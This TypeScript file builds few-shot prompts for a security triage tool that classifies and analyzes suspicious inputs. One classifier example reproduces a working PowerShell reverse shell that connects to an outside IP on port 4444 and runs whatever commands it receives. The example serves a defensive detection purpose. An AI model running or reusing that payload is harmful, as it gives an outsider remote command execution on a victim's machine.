// ─────────────────────────────────────────────────────────────
// Few-Shot Prompt Builder — Ollama SLM
//
// Constructs prompts with hardcoded few-shot examples to anchor
// phi3:mini (classifier) and mistral:7b (analyzer) to SENTRI's
// expected JSON output schemas.
//
// All examples are inline string literals — zero I/O, always
// available, works fully offline.
// ─────────────────────────────────────────────────────────────

import type { RawInput, GeminiClassification, SimilarIncident } from "../types/memory";

// ── Classifier Prompt ─────────────────────────────────────────

const CLASSIFIER_CONTENT_CAP = 6000;

/**
 * Build a few-shot classifier prompt for sentri-classifier (phi3:mini).
 * Includes 2 examples (one threat, one clean) before the real input.
 */
export function buildClassifierPrompt(input: RawInput): string {
  const contentSlice = input.content.slice(0, CLASSIFIER_CONTENT_CAP);
  const truncationNote =
    input.content.length > CLASSIFIER_CONTENT_CAP ? "\n... [truncated]" : "";

  return `EXAMPLE 1 — THREAT:
Input Type: code_snippet
Source: endpoint-monitor
Content:
$client = New-Object System.Net.Sockets.TCPClient('185.220.101.45',4444)
$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){iex ([text.encoding]::ASCII).GetString($bytes,0,$i)}

Expected Output:
{"isThreat":true,"confidence":0.97,"threatType":"malware","severity":"critical","indicators":{"c2_ip":"185.220.101.45","c2_port":4444,"technique":"reverse_shell","language":"powershell"},"reasoning":"PowerShell reverse shell establishing TCP connection to known C2 infrastructure. Classic Metasploit/Empire payload pattern.","recommendedPath":"escalate"}

---

EXAMPLE 2 — CLEAN:
Input Type: file_entry
Source: config-scanner
Filename: nginx.conf
Content:
worker_processes auto;
events { worker_connections 1024; }
http { server { listen 80; server_name example.com; location / { proxy_pass http://localhost:3000; } } }

Expected Output:
{"isThreat":false,"confidence":0.02,"threatType":null,"severity":"none","indicators":{},"reasoning":"Standard nginx reverse proxy configuration with no suspicious directives, unexpected includes, or obfuscated content.","recommendedPath":"fast"}

---

NOW CLASSIFY THIS INPUT:
Input Type: ${input.inputType}
Source: ${input.source ?? "unknown"}
${input.filename ? `Filename: ${input.filename}` : ""}
Content:
${contentSlice}${truncationNote}`;
}

// ── Analyzer Prompt ───────────────────────────────────────────

const ANALYZER_CONTENT_CAP = 12000;

/**
 * Build a few-shot analyzer prompt for sentri-analyzer (mistral:7b).
 * Includes 1 example of deep analysis before the real input.
 */
export function buildAnalyzerPrompt(
  input: RawInput,
  classification: GeminiClassification,
  similarIncidents: SimilarIncident[]
): string {
  const contentSlice = input.content.slice(0, ANALYZER_CONTENT_CAP);
  const truncationNote =
    input.content.length > ANALYZER_CONTENT_CAP ? "\n... [truncated]" : "";

  return `EXAMPLE — DEEP ANALYSIS:
Initial Classification: {"isThreat":true,"confidence":0.97,"threatType":"malware","severity":"critical","indicators":{"c2_ip":"185.220.101.45"},"reasoning":"PowerShell reverse shell"}
Similar Past Incidents: [{"id":"INC-001","distance":0.18,"metadata":{"type":"malware","severity":"critical"}}]
Raw Input: [powershell reverse shell content]

Expected Output:
{"fullAnalysis":"The submitted PowerShell script establishes a reverse TCP shell to 185.220.101.45:4444, consistent with Metasploit's windows/shell/reverse_tcp payload. The C2 IP falls within Tor exit node ranges commonly used by commodity threat actors. Combined with INC-001 from vector memory (distance 0.18), this suggests a persistent campaign targeting this environment. Immediate isolation of the affected endpoint is required before credential harvesting can occur.","attackChain":["Initial access via malicious script execution (T1059.001)","Command and control over TCP port 4444 (T1071)","Potential persistence via startup location (T1547)"],"mitigationChain":["Block outbound TCP to 185.220.101.45 on port 4444 at perimeter firewall immediately","Isolate affected endpoint from network segment","Pull memory dump from PID running the script before termination","Rotate all credentials accessible from the affected host","Search for similar scripts across all endpoints via EDR"],"cvssScore":9.8,"confidence":0.95,"relatedPatterns":["T1059.001","T1071.001","T1547.001"]}

---

NOW ANALYZE:
Initial Classification: ${JSON.stringify(classification)}
Similar Past Incidents: ${JSON.stringify(similarIncidents)}
Raw Input Type: ${input.inputType}
Source: ${input.source ?? "unknown"}

${contentSlice}${truncationNote}`;
}
